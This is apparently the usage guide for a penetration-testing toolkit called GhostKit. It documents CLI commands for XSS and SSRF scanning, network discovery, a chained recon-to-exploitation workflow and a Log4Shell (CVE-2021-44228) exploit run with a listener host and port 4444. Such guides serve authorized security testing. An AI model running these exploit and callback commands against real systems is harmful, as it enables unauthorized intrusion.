# GhostKit Usage Guide

## Command Line Interface

GhostKit features a powerful command-line interface (CLI) that provides access to all modules and functionality.

## Basic Command Structure

```
python ghostkit.py [global options] --module <module_name> [module options]
```

## Global Options

| Option | Description |
|--------|-------------|
| `--help`, `-h` | Display help and usage information |
| `--list`, `-l` | List all available modules with descriptions |
| `--version`, `-v` | Display version information |
| `--verbose` | Enable verbose output (shows detailed execution steps) |
| `--debug` | Enable debug mode with maximum information |
| `--log-file FILE` | Write logs to specified file |
| `--log-level LEVEL` | Set logging level (debug, info, warning, error, critical) |
| `--config FILE` | Use custom configuration file |
| `--no-color` | Disable colored output |

## Module Management

### Listing Available Modules

```bash
# List all modules
python ghostkit.py --list

# List modules with detailed descriptions
python ghostkit.py --list --verbose

# List modules by category
python ghostkit.py --list --category web
```

### Getting Module Help

```bash
# Get help for a specific module
python ghostkit.py --module web_xss_scanner --help
```

## Common Usage Patterns

### Web Security Testing

#### Basic Web Scanning

```bash
# Scan a website for common vulnerabilities
python ghostkit.py --module web_scan_all --url https://example.com
```

#### XSS Scanning

```bash
# Basic XSS scan
python ghostkit.py --module web_xss_scanner --url https://example.com

# Advanced XSS scan with custom parameters
python ghostkit.py --module web_xss_scanner --url https://example.com \
  --params username,password,search \
  --headers "User-Agent: Mozilla/5.0" \
  --cookies "session=abc123" \
  --output xss_results.json
```

#### SSRF Scanning

```bash
# Basic SSRF scan
python ghostkit.py --module web_ssrf_scanner --url https://example.com

# Advanced SSRF scan with callback server
python ghostkit.py --module web_ssrf_scanner --url https://example.com \
  --callback-server 192.168.1.100:8080 \
  --payload-list custom_payloads.txt
```

### Network Scanning and Exploitation

#### Network Discovery

```bash
# Scan network range
python ghostkit.py --module network_scanner --range 192.168.1.0/24

# Scan specific ports
python ghostkit.py --module network_scanner --range 192.168.1.0/24 --ports 22,80,443,8080
```

#### Vulnerability Assessment

```bash
# Scan for vulnerabilities on a target
python ghostkit.py --module vulnerability_scanner --target 192.168.1.100
```

#### Exploitation

```bash
# Run exploit with default options
python ghostkit.py --module exploit_engine --exploit CVE-2021-44228 --target 192.168.1.100

# Run exploit with custom payload
python ghostkit.py --module exploit_engine --exploit CVE-2021-44228 \
  --target 192.168.1.100 --payload custom --lhost 192.168.1.10 --lport 4444
```

### Hardware Interface

#### Serial Communication

```bash
# Connect to serial device
python ghostkit.py --module hardware_interface --action connect \
  --port /dev/ttyUSB0 --baud 115200

# Scan for available serial devices
python ghostkit.py --module hardware_interface --action scan_serial
```

#### Firmware Operations

```bash
# Dump firmware from device
python ghostkit.py --module hardware_interface --action firmware_dump \
  --device esp32 --port COM3 --output firmware.bin
```

### AI-Powered Analysis

```bash
# Train neural swarm on dataset
python ghostkit.py --module neural_swarm --action train \
  --data-dir ./training_data --model-output model.pkl

# Analyze target with neural swarm
python ghostkit.py --module neural_swarm --action analyze \
  --target 192.168.1.100 --model model.pkl
```

## Advanced Features

### Module Chaining

GhostKit allows chaining multiple modules for complex workflows:

```bash
# Chain reconnaissance, scanning, and exploitation
python ghostkit.py --chain "network_scanner,vulnerability_scanner,exploit_engine" \
  --target 192.168.1.100
```

### Output Formats

Control how results are presented:

```bash
# Output to JSON file
python ghostkit.py --module web_xss_scanner --url https://example.com --output-format json --output results.json

# Output to HTML report
python ghostkit.py --module web_xss_scanner --url https://example.com --output-format html --output report.html
```

### Automation and Scripting

#### Using Configuration Files

Create a JSON configuration file for complex scans:

```json
{
  "module": "web_scan_all",
  "url": "https://example.com",
  "params": ["username", "password", "search"],
  "headers": {
    "User-Agent": "Mozilla/5.0",
    "X-Custom": "Value"
  },
  "cookies": "session=abc123",
  "output": "results.json"
}
```

Then run:

```bash
python ghostkit.py --config scan_config.json
```

#### Scheduling Regular Scans

Use cron jobs (Linux/macOS) or Task Scheduler (Windows) to run GhostKit regularly:

```bash
# Example cron entry for daily scan at 2 AM
0 2 * * * cd /path/to/ghostkit && python ghostkit.py --config daily_scan.json > /var/log/ghostkit_scan.log 2>&1
```

## Environment Variables

GhostKit respects the following environment variables:

| Variable | Description |
|----------|-------------|
| `GHOSTKIT_CONFIG` | Path to default configuration file |
| `GHOSTKIT_LOG_LEVEL` | Default logging level |
| `GHOSTKIT_PROXY` | HTTP/HTTPS proxy for outgoing connections |
| `GHOSTKIT_API_KEYS` | Path to API keys file |

## Error Handling

Common error codes and their meaning:

| Code | Meaning |
|------|---------|
| 1 | General error |
| 2 | Configuration error |
| 3 | Network error |
| 4 | Permission error |
| 5 | Module error |

## Security Considerations

- Always run GhostKit in a controlled environment
- Use with proper authorization
- Be cautious with exploits and payloads
- Review and understand outputs before acting on them

## Further Resources

- [Module Documentation](usage.md) - Detailed guides for each module
- [Workflows](usage.md) - Common assessment workflows
- [API Reference](usage.md) - Documentation for the GhostKit API
- [Troubleshooting](index.md) - Solutions to common problems
